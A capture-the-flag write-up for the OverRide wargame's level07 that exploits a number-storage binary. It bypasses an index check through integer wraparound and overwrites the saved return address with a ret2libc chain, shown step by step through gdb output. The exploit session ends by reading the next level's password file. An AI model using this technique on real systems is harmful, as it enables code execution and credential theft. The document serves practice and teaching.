# level07

This program is a simple number storage system. It stores and reads number in an array `unsigned int data[100]`. But we cannot store a number with `index % 3 == 0`.

## Step 1. Calculate offset to overwrite `eip`
```
level07@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level07
Dump of assembler code for function main:
   0x08048723 <+0>:	push   ebp
   0x08048724 <+1>:	mov    ebp,esp
   0x08048726 <+3>:	push   edi
   0x08048727 <+4>:	push   esi
   0x08048728 <+5>:	push   ebx
   0x08048729 <+6>:	and    esp,0xfffffff0
   0x0804872c <+9>:	sub    esp,0x1d0
[...]
   0x080488e3 <+448>:	lea    eax,[esp+0x24]
   0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
   0x080488ea <+455>:	call   0x8048630 <store_number>
[...]
```
Offset is `0x1d0 - 0x24 + 0x8(padding) + 0x4(ebx) + 0x4(esi) + 0x4(edi) + 0x4(ebp) = 0x1c4(452)`. For a 32 bit integer array, `eip` locates in `data[114]`.

## Step 2. Find a way to set data[114]
```
level07@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble store_number" level07
Dump of assembler code for function store_number:
[...]
   0x08048666 <+54>:	call   0x80485e7 <get_unum>
   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
[...]
   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486c5 <+149>:	shl    eax,0x2
   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
   0x080486d0 <+160>:	mov    eax,0x0
   0x080486d5 <+165>:	leave
   0x080486d6 <+166>:	ret
End of assembler dump.
```
We cannot set `data[114]` directly because `114 % 3 == 0`. The disassembly code shows that left shift 2 position is analogous to multiply by 4. So our goal here is to find a number who satisfies the equation `114 << 2 = X << 2`. We can find three numbers `1073741938, 2147483762 and 3221225586` by flipping bit 30 and bit 31, but `3221225586 % 3 == 0`.

## Step 3. Find ret2libc address
```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

0xf7e6aed0 => 4159090384 => system
0xf7e5eb70 => 4159040368 => exit
0xf7f897ec => 4160264172 => "/bin/sh"
```

## Step 4. Input numbers into system
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/$(whoami)/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
